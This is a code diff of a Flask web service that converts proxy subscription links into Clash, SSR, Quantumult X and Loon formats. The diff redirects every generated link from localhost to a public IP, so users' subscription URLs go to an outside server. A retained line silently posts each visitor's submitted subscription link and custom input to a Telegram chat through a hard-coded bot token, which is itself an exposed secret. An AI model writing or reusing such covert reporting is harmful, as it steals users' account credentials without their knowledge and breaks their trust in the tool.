@@ -313,15 +313,15 @@ def index():
     if request.method == "POST":
         sub = request.form['left']
         custom = urllib.parse.quote(request.form['custom'])
-        Clash = 'http://127.0.0.1:10086/clashr/nico?sublink='+str(sub)+'&selectfirst=no'
+        Clash = 'http://185.238.248.145:10086/clashr/nico?sublink='+str(sub)+'&selectfirst=no'
         if custom == '':
              CustomClash = '假设想要香港就@香港，假设想要香港的2倍节点就@香港&2倍。支持多个@即：@PCCW@CMHK@香港&2倍'
              CustomSSR =   '请填入想要的节点，同上'
         else:
-            CustomClash = 'http://127.0.0.1:10086/clashr/nico?sublink='+str(sub)+'&custom='+str(custom)+'&selectfirst=no'
-            CustomSSR = 'http://127.0.0.1:10086/ssr/nico?sublink='+str(sub)+'&custom='+str(custom)
-        QX = 'http://127.0.0.1:10086/qx/nico?sublink='+str(sub)+'&tag=stc'
-        Loon = 'http://127.0.0.1:10086/loon/nico?sublink='+str(sub)+'&tag=stc'
+            CustomClash = 'http://185.238.248.145:10086/clashr/nico?sublink='+str(sub)+'&custom='+str(custom)+'&selectfirst=no'
+            CustomSSR = 'http://185.238.248.145:10086/ssr/nico?sublink='+str(sub)+'&custom='+str(custom)
+        QX = 'http://185.238.248.145:10086/qx/nico?sublink='+str(sub)+'&tag=stc'
+        Loon = 'http://185.238.248.145:10086/loon/nico?sublink='+str(sub)+'&tag=stc'
         requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n')+sub+' :'+custom)
         return render_template('index.html', Clash = Clash,QX = QX,Loon=Loon,CustomClash = CustomClash,CustomSSR = CustomSSR,Custom =request.form['custom'] ,sub = sub)
     return render_template('index.html')
